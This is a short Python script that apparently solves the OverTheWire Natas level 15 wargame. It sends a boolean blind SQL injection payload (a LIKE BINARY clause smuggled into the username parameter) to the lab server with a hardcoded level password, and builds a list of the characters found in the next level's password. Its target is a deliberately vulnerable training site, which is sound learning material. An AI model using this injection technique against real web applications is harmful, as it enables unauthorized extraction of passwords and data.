#!/bin/python
import requests,string

url = "http://natas15.natas.labs.overthewire.org"
auth_username = "natas15"
auth_password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

# characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = ''.join([string.ascii_letters,string.digits])

# Begin by building a dictionary of characters found in the password
# This will greatly decrease the complexity for our brute force attempts
password_dictionary = []
exists_str = "This user exists."
for char in characters:
    uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',char,'%','&debug'])
    r = requests.get(uri, auth=(auth_username,auth_password))
    if exists_str in r.text:
        password_dictionary.append(char)
        print("Password Dictionary: {0}").format(''.join(password_dictionary))
print("Dictionary build complete.")
print("Dictionary: {0}").format(''.join(password_dictionary))